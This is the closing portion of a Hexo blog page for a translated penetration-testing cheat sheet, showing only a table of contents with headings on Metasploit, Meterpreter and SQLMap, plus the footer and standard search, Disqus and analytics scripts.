class="nav-link" href="#用NMAP模拟TTY-Shell"><span class="nav-number">1.25.7.</span> <span class="nav-text">用NMAP模拟TTY Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit-速查表"><span class="nav-number">1.26.</span> <span class="nav-text">Metasploit 速查表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Meterpreter-Payloads"><span class="nav-number">1.26.1.</span> <span class="nav-text">Meterpreter Payloads</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-反向meterpreter-payload"><span class="nav-number">1.26.2.</span> <span class="nav-text">Windows 反向meterpreter payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-VNC-Meterpreter-payload"><span class="nav-number">1.26.3.</span> <span class="nav-text">Windows VNC Meterpreter payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-反向Meterpreter-payload"><span class="nav-number">1.26.4.</span> <span class="nav-text">Linux 反向Meterpreter payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter速查表"><span class="nav-number">1.27.</span> <span class="nav-text">Meterpreter速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用Metasploit-模块"><span class="nav-number">1.28.</span> <span class="nav-text">常用Metasploit 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#远程Windows-Metasploit-模块-exploits"><span class="nav-number">1.28.1.</span> <span class="nav-text">远程Windows Metasploit 模块(exploits)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地Windows-Metasploit-模块-exploits"><span class="nav-number">1.28.2.</span> <span class="nav-text">本地Windows Metasploit 模块(exploits)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#辅助Metasploit-模块"><span class="nav-number">1.28.3.</span> <span class="nav-text">辅助Metasploit 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit-Powershell-模块"><span class="nav-number">1.28.4.</span> <span class="nav-text">Metasploit Powershell 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-后渗透Metasploit-模块"><span class="nav-number">1.28.5.</span> <span class="nav-text">Windows 后渗透Metasploit 模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASCII表速查"><span class="nav-number">1.29.</span> <span class="nav-text">ASCII表速查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCO-IOS-网际操作系统-命令"><span class="nav-number">1.30.</span> <span class="nav-text">CISCO IOS(网际操作系统) 命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码学"><span class="nav-number">1.31.</span> <span class="nav-text">密码学</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#哈希长度"><span class="nav-number">1.31.1.</span> <span class="nav-text">哈希长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#哈希例子"><span class="nav-number">1.31.2.</span> <span class="nav-text">哈希例子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMap例子"><span class="nav-number">1.32.</span> <span class="nav-text">SQLMap例子</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">findneo</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  

    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://findneo.github.io/180727PenetrationTool/';
          this.page.identifier = '180727PenetrationTool/';
          this.page.title = '【译】渗透测试工具备忘录';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://findneo.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  














  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  
  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>


  

</body>
</html>
